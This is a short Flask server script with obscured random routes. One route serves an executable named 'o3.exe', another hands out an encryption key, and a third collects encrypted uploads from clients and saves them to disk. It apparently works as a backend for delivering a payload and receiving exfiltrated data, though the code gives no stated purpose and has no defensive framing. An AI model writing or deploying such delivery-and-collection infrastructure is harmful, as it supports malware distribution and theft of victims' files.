from flask import Flask, send_file, request, render_template
import os

app = Flask(__name__)

ENCRYPTION_KEY = os.urandom(32)

@app.route('/')
def index():
	return render_template('index.html')

@app.route('/DjDKVGyp', methods=['GET'])
def get_app():
	return send_file("o3.exe", as_attachment=True)

@app.route('/tYoozeAA', methods=['GET'])
def get_key():
    print(f"Key requested by client: {ENCRYPTION_KEY.hex()}")
    return ENCRYPTION_KEY

@app.route('/gCoylMjj', methods=['POST'])
def upload_data():
    full_data = request.data
    if len(full_data) < 16:
        return "Invalid data", 400

    encrypted_payload = full_data[:-16]
    received_iv = full_data[-16:]

    print(f"Received total: {len(full_data)} bytes")
    print(f"Payload size: {len(encrypted_payload)} bytes")
    print(f"IV (hex): {received_iv.hex()}")

    with open("received_file.enc", "wb") as f:
        f.write(full_data)
        
    return "Upload successful", 200

if __name__ == '__main__':
    print("Server starting on http://localhost:8081...")
    app.run(host='0.0.0.0', port=8081)
